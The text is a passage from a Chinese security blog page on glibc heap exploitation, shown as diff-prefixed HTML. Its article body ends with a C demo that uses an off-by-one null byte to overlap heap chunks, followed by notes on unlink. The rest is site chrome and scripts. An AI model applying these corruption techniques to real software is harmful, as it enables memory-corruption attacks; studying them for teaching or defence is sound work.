class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint8_t</span>* a;</span><br><span class="line">  <span class="keyword">uint8_t</span>* b;</span><br><span class="line">  <span class="keyword">uint8_t</span>* c;</span><br><span class="line">  <span class="keyword">uint8_t</span>* b1;</span><br><span class="line">  <span class="keyword">uint8_t</span>* b2;</span><br><span class="line">  <span class="keyword">uint8_t</span>* d;</span><br><span class="line">  a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x108</span>);</span><br><span class="line">  b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  *(<span class="keyword">size_t</span>*)(b + <span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  a[<span class="number">0x108</span>] = <span class="number">0</span>;</span><br><span class="line">  b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">free</span>(b1);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意,<code>delete</code>时会向下检测两个<code>chunk</code>的正确性,需要提前构造.</p>
+<p>也可以通过<code>off_by_one</code>修改下一个<code>chunk</code>的<code>size</code>成员<code>P</code>标志位,从而实现<code>unlink</code>漏洞利用.</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/20c63326/" rel="next" title="Math-probability-theory-大数定律及中心极限定理">
+                <i class="fa fa-chevron-left"></i> Math-probability-theory-大数定律及中心极限定理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/78d1a8e0/" rel="prev" title="CS-develop-BackEnd-Spring-Boot-基础">
+                CS-develop-BackEnd-Spring-Boot-基础 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/apple-touch-icon.png" alt="w4rd3n">
+            
+              <p class="site-author-name" itemprop="name">w4rd3n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">43</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/hitworld" title="GitHub &rarr; https://github.com/hitworld" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#house全家桶"><span class="nav-number">1.</span> <span class="nav-text">house全家桶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#house_of_force"><span class="nav-number">1.1.</span> <span class="nav-text">house_of_force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house_of_lore"><span class="nav-number">1.2.</span> <span class="nav-text">house_of_lore</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house_of_orange"><span class="nav-number">1.3.</span> <span class="nav-text">house_of_orange</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house_of_roman"><span class="nav-number">1.4.</span> <span class="nav-text">house_of_roman</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house_of_spirit"><span class="nav-number">1.5.</span> <span class="nav-text">house_of_spirit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house_of_spirit-with-tcache"><span class="nav-number">1.6.</span> <span class="nav-text">house_of_spirit with tcache</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各种bin_attack"><span class="nav-number">2.</span> <span class="nav-text">各种bin_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin_attack"><span class="nav-number">2.1.</span> <span class="nav-text">fastbin_attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unsorted_bin_attack"><span class="nav-number">2.2.</span> <span class="nav-text">unsorted_bin_attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#large_bin_attack"><span class="nav-number">2.3.</span> <span class="nav-text">large_bin_attack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others"><span class="nav-number">3.</span> <span class="nav-text">others</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">3.1.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#off_by_one"><span class="nav-number">3.2.</span> <span class="nav-text">off_by_one</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-gg-circle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w4rd3n</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">727k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">11:01</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function ({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', `/classes/Counter/${counter.objectId}`, JSON.stringify({ time: { "__op":"Increment", "amount":1 } }))
+            
+            .done(function () {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.time + 1);
+            })
+            
+            .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+            })
+          } else {
+            
+              Counter('post', '/classes/Counter', JSON.stringify({ title: title, url: url, time: 1}))
+                .done(function () {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(1);
+                })
+                .fail(function () {
+                  console.log('Failed to create');
+                });
+            
+          }
+        })
+      .fail(function ({ responseJSON }) {
+        console.log('LeanCloud Counter Error:' + responseJSON.code + " " + responseJSON.error);
+      });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + "no3Ip4mNLc3JyF1AeTy8LrAm-gzGzoHsz")
+        .done(function ({ api_server }) {
+          var Counter = function (method, url, data) {
+            return $.ajax({
+              method: method,
+              url: `https://${api_server}/1.1${url}`,
+              headers: {
+                'X-LC-Id': "no3Ip4mNLc3JyF1AeTy8LrAm-gzGzoHsz",
+                'X-LC-Key': "UvlYMzpJKw0Jrw61V5BA5ifU",
+                'Content-Type': 'application/json',
+              },
+              data: data,
+            });
+          };
+          
+          addCount(Counter);
+          
+        })
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>;
+  <script>
+  //$("body").backstretch("/images/background.jpg");
+  </script>
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+</html>
